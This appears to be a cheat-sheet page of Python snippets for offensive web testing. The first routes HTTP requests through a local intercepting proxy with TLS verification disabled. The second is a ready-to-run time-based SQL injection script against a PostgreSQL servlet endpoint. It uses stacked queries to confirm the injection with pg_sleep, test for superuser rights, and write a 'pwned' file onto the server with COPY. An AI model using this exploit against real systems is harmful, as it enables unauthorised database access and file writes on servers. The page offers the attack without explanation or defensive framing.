# Python Code Block

## HTTP Proxy + Simple Request

{% code overflow="wrap" %}
```python
import requests

# -----Disable SSL warning-----
requests.packages.urllib3.disable_warnings()


# -----PROXY-----
session = requests.Session()
session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

session.verify = False

# -----GET Request Example-----
response = session.get("https://example.com")
print(response.text)


# -----POST Request Example-----
data = {
    "parameter": "value"
}

response = session.post("https://example.com/api", data=data)
print(response.status_code)
print(response.text)
```
{% endcode %}

## PostgreSQL

{% code overflow="wrap" %}
```python
# -----Base URL-----
base_url = "https://test/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"

# -----PostgreSQL payloads-----
pgq_sleep = ";select+pg_sleep(10);"
pgq_superuser = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--"
pgq_write = ";COPY (SELECT $$pwned$$) to $$c:\\pwned.txt$$;--"

# -----Request-----
try:
    # First: test with pg_sleep
    response = session.get(base_url + pgq_sleep, timeout=25)
    elapsed = response.elapsed.total_seconds()
    if elapsed >= 10:
        print(f"SQLi success. Response time: {elapsed} seconds.\nChecking SuperUser access...")

        # Second: test for superuser
        response = session.get(base_url + pgq_superuser, timeout=25)
        elapsed = response.elapsed.total_seconds()
        if elapsed >= 10:
            print(f"Success. Response time: {elapsed} seconds.\nYou are superuser.")
            response = session.get(base_url + pgq_write, timeout=25)
        else:
            print("Superuser check failed.")
    else:
        print("pg_sleep test failed.")
except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")
```
{% endcode %}
